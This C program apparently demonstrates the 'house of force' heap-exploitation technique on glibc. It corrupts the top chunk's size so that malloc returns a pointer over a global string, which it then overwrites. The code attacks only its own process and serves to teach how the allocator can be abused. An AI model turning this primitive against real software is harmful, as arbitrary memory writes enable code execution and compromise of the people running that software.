#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>

// inspired by https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c

char data[] = "change me please :)\0";

int main(int argc, char* argv[]){
    intptr_t* first_chunk = malloc(256);

    // get the real size of the block, so we know
    // what is the size with which we can operate
    int s = malloc_usable_size(first_chunk);

    // get the address of top chunk
    intptr_t* top_chunk = (intptr_t*) ((char*) first_chunk + s - sizeof(long));

    // rewrite the size of top chunk to the maximum
    *(intptr_t*) ((char*) top_chunk + sizeof(long)) = -1;
    // we have 0xffffffffffffffff in top chunk size
    // we want to create as big number of bytes to get
    // as close as possible to the "data" variable
    // calc: new_addr = old_addr + number_bytes =>
    // number_bytes = new_addr - old_addr =>
    // x + 2 * sizeof(long) = new_addr - old_addr - 2 * sizeof(long) =>
    // x = new_addr - old_addr - 4 * sizeof(long)
    // new_addr is the address of variable "data"
    // old_addr is the address of our top chunk
    unsigned long new_size = (unsigned long) data - (unsigned long) top_chunk - 4 * sizeof(long);
    void* new_top_chunk = malloc(new_size);
    fprintf(stderr, "old value: %s\n", data);
    void* final_chunk = malloc(256);
    strcpy(final_chunk, "skoro som prisiel o zdravie :)");
    fprintf(stderr, "new value: %s\n", data);
    return 0;
}